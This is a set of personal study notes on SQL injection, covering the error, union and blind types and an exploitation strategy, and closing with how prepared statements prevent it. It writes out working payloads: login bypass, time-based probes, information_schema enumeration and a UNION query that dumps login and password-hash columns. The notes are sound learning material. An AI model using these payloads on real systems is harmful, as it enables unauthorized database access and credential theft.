# SQL injection

Sources

* https://www.youtube.com/watch?v=rdyQoUNeXSg
* http://pentestmonkey.net/category/cheat-sheet/sql-injection
* Good run-through of using sqlmap against a PHP app https://www.youtube.com/watch?v=UNq1gL5NXow

Three types of SQLi

1. In band or "error based"
    * data is extracted through the same channel used to inject the SQL code
    * the most straigtforward attack
    * data is presented in the web page
    * presenter calls this "error based SQLi" because the errors are often direclty visible on the page
    * ask the DB a question and get an error back, get info from the error
    * examples
        * ask the database to convert the current user to an integer - if the
          DB errors are shown unfilteredo on the page then the error you get
          back may dump the user info
2. "union based SQLi"
    * Use SQL `UNION` to combine the results of the real query with your
      injected queries into a single result that can be displayed on the page.
    * data may be extracted in band or out of band (e.g. email)
3. Inferential or "blind SQLi"
    * no data is actually extracted but tester is able to reconstruct
      information by  sending particular requests and observing the results
      e.g. tell DB to sleep for 10s if it is running as admin
    * establish some way of getting true/false answers from the DB about your query. This could be
        1. sleep for X seconds for true, 0 seconds for false
        1. if you get back the innocent output of the query then we infer true,
           if you get back an error page we infer false
    * craft some SQL injections to exploit this true/false answering.
    * you can ask questions like "is the first character of the current
      username 'a' and with lots of patience (or a tool) you can find out the
      full username of the current user. This technique can be used (with lots
      of patience) to get any data from the DB that the web app user has access
      to

## Strategy for exploiting SQLi

1. Identify the injection point
    * find the place where you can supply some text that is not properly escaped before being run by the DB
    * can be done with a tool or manually
    * injection points can be anytime you give the server data
        1. GET request query params
            * in theory get rquest URL could be problematic if the sever does something fancy with routing
        1. POST requests
            * we need to encode our data in the way the server expects it
        1. Cookies
1. Identify the injection type (Integer or String)
    * is it an integer or a string injection
    * ASSUMPTION: if it is a string then you can use the `'` technique
    * QUESTION: what if it is a number?
1. Attack
        * figure out whether you are
    * injection types are ranked in terms of usefulness
        * error: easiest
            ```
            # given injection point
            http://example.com/page.asp?id=1
            # check to see if it is an integer type injection
            http://example.com/page.asp?id=1 HAVING 1=1--
            # you can check the error message you get back to see whether the type was
            # wrong (i.e. its not an Integer) or something else went wrong (which implies
            # type is correct)

            # given injection poing
            http://example.com/page.asp?id=xyz

            # checking to see if it is string injeciton point (note use of ')
            http://example.com/page.asp?id=xyz' having 1=1--
            # again the error message will tell you whether you have the type correct or not
            ```
        * union: great for data extraction
            ```
            # given an injection point of type Integer
            http://example.com/page.asp?id=1

            # now figure out how many columns you need to have in the union to match
            # the original query (keep going until you don't get an error anymore
            http://example.com/page.asp?id=1 UNION SELECT ALL 1--
            # error
            http://example.com/page.asp?id=1 UNION SELECT ALL 1,2--
            # error
            http://example.com/page.asp?id=1 UNION SELECT ALL 1,2,3--
            # no error

            # now pull info out through the union
            http://example.com/page.asp?id=1 UNION SELECT ALL USER,2,3--
            ```
        * blind: worst case, last resort



if foo.asp?id="4+1" works then you know you the DB is running query for you




some examples use --+ to do the same thing as --<WHITESPACE> when sending the sql injeciton in the URL - why does this work?
    example used %20 initially but that was stripped by browser

attacks

```
' OR 1=1 --
# this nullifies the WHERE clause in the query
# this can be used if the query is
"SELECT * from users WHERE username='#{username}' AND password='#{password}'"
"SELECT * from users WHERE username='joe' AND password='bloggs'" # legit usage
"SELECT * from users WHERE username='joe' AND password='' OR 1=1 --'" # any password works


# ###############################
# in this attach we are going to use a blind sqli to get the username of the current user in the DB
# it is blind sqli so we will never actually get the username back as a result
# we first have to determine that
# 1. this point is vulnerable to sqli
# 2. some way of figuring out whether the query we sent worked or not (i.e. a true/false test). We will use this true/false test to ask the DB questions and infer the answers

' OR ascii(substr(SELECT user(), 1, 1)) > 0 #
# 1. select the username
# 2. get the first char from it
# 3. convert that char to an int
# 4. comment out the rest of the query after that
# 5. compare the it with a chosen number - this step is repeated many times with differnt numbers an operators and the true/false results from the DB are noted. This takes ages so is often automated in a tool
```

## Understanding
Looking at the form input on the page, try to guess the shape of the SQL statement it might generate .e.g if it is a search box then

```sql
SELECT ? FROM ? WHERE ? LIKE '%yourquery%';
```

seems reasonable. Now try things in `yourquery` which will give you info you should not have e.g.

```slq
-- '
SELECT ? FROM ? WHERE ? LIKE '%'%';
-- A single quote character will tell you whether the query you send is being
-- escaped. If you get an error back indicating that the query did anything except
-- perform your query properly qouted e.g. threw an error then you know you are on
-- to something.

';--
SELECT ? FROM ? WHERE ? LIKE '%';--%';
-- If you think you have found an input which has not properly escaped the data
-- then this query should return all rows in the table

Next step is to figure out which DBMS is running this thing
thing' AND 1 = SLEEP(2);--
SELECT ? FROM ? WHERE ? LIKE '%thing' AND 1 = SLEEP(2);--%';
SLEEP() is a MySQL function
WAIT_FOR_DELAY() in SQLServer
these are blind sql injections - no auto
select from guessedtablename AND sleep(5)
if it comes back slowly then you know the table name exists

-- the number of columsn you get back in the results can tell you a little more
-- about the shape of the query e.g. if you get back three columns then you can
-- reasonably assume.
SELECT ?,?,? FROM ? WHERE ? LIKE '%somequery%';

So knowing I get back 3 columsn

SELECT ?,?,? FROM ? WHERE ? LIKE '%thing' UNION (SELECT 1,2,3 FROM dual);--%';

query: thing' UNION (SELECT 1,2,3 FROM dual);--
Aside: dual is a MySQL placeholder table name for testing - TODO: find out more
the output of the query above will tell you if you are on the right track

Aside: TODO: sql UNION

query: thing' UNION (SELECT table_name,table_schema,3 FROM information_schema.tables);--
the above query will append the list of tables in the db to the search query so you can see it on the page. From there you can find tables which seem interesting e.g. "users"



query: thing' UNION (SELECT COLUMN_NAME,2,3 FROM information_schema.columns WHERE TABLE_NAME = 'users');--
gets the shape of the users table so you know which columsn to select (we have to select less than 3)

query: thing' UNION (SELECT ulogin,uhash,utype FROM users);--
```

Second order SQLi - you put something in as a query and it gets used internally as a query
i.e. the sql gets escaped but it gets stored in the DB

Outcomes of successsful SQLi

categories
1. leverage for more access
    * you may be able to get the database credentials table
        * but will likely have to crack the passwords
            * TODO: how to do this for postgres
        * postgres creds are system creds by default - does this mean postgres doesn't have a "users" table?
2. exfiltrate data from the DB
    * you will have as much access as the webabb does to the database
    * can download all data from it
    * QUESTION: can SQLi access be used to get files from disk?

### Aside: Quoting in SQL

```
[S]ingle quote for [S]trings, [D]ouble quote for things in the [D]atabase
```

* string literals, date & time literals
    * ANSI SQL uses single quotes e.g. `'my table'`
    * MySQL uses back quotes e.g. `my table`
        * `SET GLOBAL SQL_MODE=ANSI_QUOTES;` to use double quotes
    * SQLServer uses brackets by default
        * `SET QUOTED_IDENTIFIER ON;` to use double quotes
* database identifiers (e.g. table names, column names)
    * ANSI SQL uses double quotes
    * only required if column name contains
        1. reserved words e.g. `table`
        1. case sensitive e.g. `MyTable`
        1. international characters
        1. spaces e.g. `my table`
        1. punctuation e.g. `my-table`


## How prepared statements help

the query and the data are sent to the SQL server separately.

 SQL query is a full legitimate program. And we are creating this program dynamically by adding some data on the fly.

 The root of the SQL injection problem is mixing of the code and the data.

 bound parameters will help with the primary SQLi i.e. if you submit `'; DROP tables;--` and the query uses bound params then it won't be run **but** if other code picks up that string later on and runs it naievely then it will work. That other code can be
    * code in the app
    * DB trigger, stored procedure, user defined function

> With bound parameters, the query tree is parsed, then, in PostgreSQL at least, the data is looked at in order to plan. The plan is executed. With prepared statements, the plan is saved so you can re-execute the same plan with different data over and over (this may or may not be what you want). But the point is that with bound parameters, a parameter cannot inject anything into the parse tree. So this class of SQL injection issue is properly taken care of.


